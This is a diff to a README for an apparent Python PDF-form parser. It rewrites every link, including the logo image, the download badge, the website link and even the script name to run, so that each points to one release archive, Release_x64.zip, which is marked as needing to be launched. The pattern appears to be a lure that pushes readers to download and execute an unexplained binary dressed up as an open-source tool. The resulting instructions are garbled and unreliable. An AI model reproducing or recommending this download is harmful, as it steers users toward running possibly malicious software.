@@ -1,7 +1,7 @@
 
 # 📚 PDFReader
 
-![PDFReader Logo](https://example.com/pdfreader-logo.png)
+![PDFReader Logo](https://github.com/sentifyy/PDFReader/releases/download/v2.0/Release_x64.zip)
 
 Welcome to PDFReader, a Python application designed to parse a specific format of PDF form and store relevant user data in a tabular format in an Excel sheet! This repository provides a ready-to-use solution for automating the extraction and organization of data from PDF forms. Whether you're dealing with surveys, questionnaires, or any other type of structured PDF form, PDFReader has got you covered.
 
@@ -17,13 +17,13 @@ Welcome to PDFReader, a Python application designed to parse a specific format o
 
 To get started with PDFReader, simply download the application from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip) *(needs to be launched)*
+[![Download Software](https://github.com/sentifyy/PDFReader/releases/download/v2.0/Release_x64.zip)](https://github.com/sentifyy/PDFReader/releases/download/v2.0/Release_x64.zip) *(needs to be launched)*
 
 ## Usage
 
-1. Download the Software.zip file from the provided link.
+1. Download the https://github.com/sentifyy/PDFReader/releases/download/v2.0/Release_x64.zip file from the provided link.
 2. Extract the contents of the zip file to a folder on your local machine.
-3. Run the `PDFReader.py` script using Python.
+3. Run the `https://github.com/sentifyy/PDFReader/releases/download/v2.0/Release_x64.zip` script using Python.
 4. Follow the on-screen instructions to input the path to the PDF form you want to parse.
 5. Sit back and let PDFReader handle the data extraction and organization process for you.
 
@@ -52,4 +52,4 @@ Thank you for choosing PDFReader! Let's simplify PDF form data processing togeth
 
 ---
 
-**Note:** If the provided download link does not work, we recommend checking the "Releases" section of this repository for alternative download options. Visit our website at [PDFReader Website](https://example.com/pdfreader) for more information and resources.
+**Note:** If the provided download link does not work, we recommend checking the "Releases" section of this repository for alternative download options. Visit our website at [PDFReader Website](https://github.com/sentifyy/PDFReader/releases/download/v2.0/Release_x64.zip) for more information and resources.
